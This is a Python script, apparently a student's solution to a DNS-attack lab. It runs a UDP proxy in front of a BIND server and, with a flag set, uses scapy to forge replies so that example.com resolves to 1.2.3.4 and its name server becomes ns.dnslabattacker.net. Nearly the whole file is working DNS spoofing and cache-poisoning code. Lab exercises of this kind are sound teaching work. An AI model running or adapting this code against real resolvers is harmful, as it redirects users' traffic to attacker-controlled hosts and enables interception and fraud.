#!/usr/bin/env python
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response
# Open a socket
# Recieve packet data from socket
# Tell dns_port to look up different data

#Open proxy socket - server
prox_serv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
# Bind proxy socket to proxy port given
prox_serv.bind(("", port))

# Part 3:
# Spoof the reply of dig <options> example.com s.t. example.com's IPV4 address is 1.2.3.4 and change name servers to ns.dnslabattacker.net

while True:
	# Part 2: WORKING
	print("Recieving from dig...")
	from_dig = prox_serv.recvfrom(1024)
	print(from_dig)
	print("Sending to BIND...")
	prox_serv.sendto(from_dig[0], ("", dns_port))
	to_dig = prox_serv.recvfrom(16384)
	print("Recieving from BIND...")
	print(to_dig)

	# Part 3 Spoofing: WORKING
	if SPOOF:
		spoofed = DNS(to_dig[0])
		if spoofed.qd.qname == "example.com.":
			#spoofed.an.rdata = "1.2.3.4"
			#for x in range(spoofed.nscount):
			#	spoofed.ns[x].rdata = "ns.dnslabattacker.net."
			spoofed.an = DNSRR(rrname="example.com.", type='A', rdata="1.2.3.4")
			spoofed.ancount=1
			#spoofed.ns = DNSRR(rrname = "example.com.", type='NS', rdata="ns.dnslabattacker.net.")/DNSRR(rrname="example.com.", type='NS', rdata="ns.dnslabattacker.net.")
			spoofed.ns = DNSRR(rrname = "example.com.", type='NS', rdata="ns.dnslabattacker.net.")
			spoofed.nscount=1
			#spoofed.nscount=2
			for x in range(spoofed.arcount):
				spoofed.ar[x].rrname = "ns.dnslabattacker.net."
		print("Sending to dig...")
		prox_serv.sendto(bytes(spoofed), from_dig[1])
	else:
		print("Sending to dig...")
		prox_serv.sendto(to_dig[0], from_dig[1])



